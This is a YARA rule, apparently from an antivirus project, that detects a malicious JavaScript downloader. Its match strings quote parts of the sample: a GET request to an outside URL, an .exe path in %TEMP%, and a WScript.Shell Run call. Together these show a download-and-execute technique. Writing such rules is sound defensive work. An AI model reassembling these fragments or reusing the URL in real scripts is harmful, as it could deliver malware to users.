rule sig_20160329_22a3fd824dad0c2a30ebad90e0f4cbc1 {
  meta:
    description = "datamaliciousorder - file 20160329_22a3fd824dad0c2a30ebad90e0f4cbc1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6ec3040579c66352039f4e9acf17f54ff85d698fcb9a9fe905cdac61adcd3f93"

  strings:
    $s1  = "w[uA](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function fT() {return z[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"HGBIwg4wm1qHm5eV.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[P](vx() * 11); if (w[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var z = function o() {return WScript[oL](\"WScript.Shell\");}(), H = 11;" fullword ascii
    $s5  = "function A(JI, H0){R = R * 1; return JI - H0;};" fullword ascii
    $s6  = "function o0(){return \"\" + pS;};" fullword ascii
    $s7  = "function U() {return ((Uc == true) && (Uc == Ay)) ? 1 : R;};" fullword ascii
    $s8  = "function F(Z){z[\"Run\"](Z, R, R);};" fullword ascii
    $s9  = "function K(Vd) {var kN = (1, 2, 3, 4, 5, Vd); return kN;};" fullword ascii
    $s10 = "return A(C, s);" fullword ascii
    $s11 = " while (V){" fullword ascii
    $s12 = "function UC()" fullword ascii
    $s13 = "function vx(){return 22;};" fullword ascii
    $s14 = "function n(){return oL;};" fullword ascii
    $s15 = "var f = new this[\"Date\"]();" fullword ascii
    $s16 = "var c = false;" fullword ascii
    $s17 = "Ay = true; " fullword ascii
    $s18 = "var Ay = false;" fullword ascii
    $s19 = "var Uc = false;" fullword ascii
    $s20 = "Uc = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}